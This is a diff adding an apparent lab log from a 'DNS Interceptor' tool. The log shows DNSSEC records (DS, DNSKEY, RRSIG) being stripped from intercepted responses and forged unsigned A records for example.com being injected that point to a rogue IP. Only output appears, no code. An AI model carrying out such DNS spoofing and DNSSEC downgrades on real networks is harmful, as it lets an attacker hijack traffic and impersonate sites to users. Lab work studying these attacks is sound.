@@ -1,0 +1,21 @@
+=== DNS Interceptor (Phase 4) ===
+Mode: STRIP AND FORGE
+Strip parent DS: yes
+Target Domain: example.com
+Rogue IP: 172.16.1.30
+Listening Interface: eth0
+Attacker MAC: 12:e0:46:cd:e4:b6
+Resolver MAC: 5a:95:5b:b1:4b:1c
+[+] Interceptor ready and listening on eth0...
+[*] Intercepted parent response containing example.com DS
+[+] Stripped DS/RRSIG from com referral (unsigned referral injected)
+[*] Intercepted target response for: example.com (type A) from 172.16.3.30 (ANCOUNT=2)
+[+] Unsigned forged A injected: example.com -> 172.16.1.30 (TXID: 0xca52, UDP port: 36390)
+[*] Intercepted parent response containing example.com DS
+[+] Stripped DS/RRSIG from explicit DS response
+[*] Intercepted target response for: example.com (type A) from 172.16.3.30 (ANCOUNT=2)
+[+] Unsigned forged A injected: example.com -> 172.16.1.30 (TXID: 0x5c8d, UDP port: 53420)
+[*] Intercepted DNSKEY response for example.com
+[+] Stripped child DNSKEY/RRSIG records
+[*] Intercepted DNSKEY response for example.com
+[+] Stripped child DNSKEY/RRSIG records
